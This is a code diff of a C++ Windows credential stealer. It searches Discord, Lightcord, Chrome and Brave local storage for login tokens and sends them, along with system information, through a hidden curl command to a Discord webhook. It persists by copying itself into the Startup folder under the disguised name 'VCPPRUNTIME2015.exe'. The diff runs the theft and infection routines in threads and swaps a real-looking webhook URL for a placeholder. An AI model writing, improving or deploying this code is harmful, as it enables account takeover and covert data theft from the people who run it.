@@ -7,38 +7,19 @@
 #include <filesystem>
 #include <Windows.h>
 #include <sys/stat.h>
+#include <thread>
 
 namespace fs = std::filesystem;
 
 std::string webhookSend(std::string token) {
 
 	char cmd[1024];
-	sprintf(cmd, "curl -d \"content=%s\" https://discord.com/api/webhooks/840820010393927690/dZNKDNStWVr3eeScafGHrN_GGGd9xuXK9GbZaEZm2zV2AbfaKiQ9RgtH2F5_NvBI3aPG", token.c_str());
+	sprintf(cmd, "curl -d \"content=%s\" WEBHOOKHERE", token.c_str());
 	WinExec(cmd, SW_HIDE);
 
 	return cmd;
 }
 
-std::vector<std::string> findMatch(std::string str, std::regex reg)
-{
-	std::vector<std::string> output;
-	std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
-	std::sregex_iterator lastMatch;
-
-	while (currentMatch != lastMatch) {
-		std::smatch match = *currentMatch;
-		output.push_back(match.str());
-		currentMatch++;
-	}
-
-	return output;
-}
-
-bool pathExists(const std::string& s)
-{
-	struct stat buffer;
-	return (stat(s.c_str(), &buffer) == 0);
-}
 
 void sendPcInfo() {
 	SYSTEM_INFO siSysInfo;
@@ -71,31 +52,39 @@ void sendPcInfo() {
 	return;
 }
 
-int main(int argc, char* argv[]) {
-	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+std::vector<std::string> findMatch(std::string str, std::regex reg)
+{
+	std::vector<std::string> output;
+	std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
+	std::sregex_iterator lastMatch;
 
+	while (currentMatch != lastMatch) {
+		std::smatch match = *currentMatch;
+		output.push_back(match.str());
+		currentMatch++;
+	}
+
+	return output;
+}
+
+bool pathExists(const std::string& s)
+{
+	struct stat buffer;
+	return (stat(s.c_str(), &buffer) == 0);
+}
+
+
+
+void MainRoutine() {
 	// Computer informations
 
 	sendPcInfo();
 
-	// Persistence
-
-	char BUFFER[MAX_PATH];
-	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH);
-	char szPath[1024];
-	char szPath2[1024];
-
-	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH);
-	sprintf(szPath, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\VCPPRUNTIME2015.exe", std::getenv("appdata"));
-	fs::remove(szPath);
-	fs::copy(BUFFER, szPath);
-
-
 	// Finding token
 
 	std::vector<std::string> installs = { "\\Lightcord\\Local Storage\\leveldb", "\\Discord\\Local Storage\\leveldb",
-		"\\discordptb\\Local Storage\\leveldb", "\\discordcanary\\Local Storage\\leveldb", 
-		"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", 
+		"\\discordptb\\Local Storage\\leveldb", "\\discordcanary\\Local Storage\\leveldb",
+		"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
 		"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb" };
 
 
@@ -121,7 +110,7 @@ int main(int argc, char* argv[]) {
 		logging_file.close();
 
 		// End
-		
+
 		if (!pathExists(path)) {
 			continue;
 		}
@@ -157,5 +146,31 @@ int main(int argc, char* argv[]) {
 
 
 	}
+	Sleep(1000);
+	return;
+}
 
+void InfectRoutine() {
+	char BUFFER[MAX_PATH];
+	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH);
+	webhookSend(BUFFER);
+	char szPath[1024];
+	char szPath2[1024];
+
+	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH);
+	sprintf(szPath, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\VCPPRUNTIME2015.exe", std::getenv("appdata"));
+	if (strcmp(szPath, BUFFER) == 0) {
+		return;
+	}
+	fs::remove(szPath);
+	fs::copy(BUFFER, szPath);
+	return;
+}
+
+int main(int argc, char* argv[]) {
+	//::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+
+	std::thread mr(MainRoutine);
+	std::thread ir(InfectRoutine);
+	mr.join();
 }
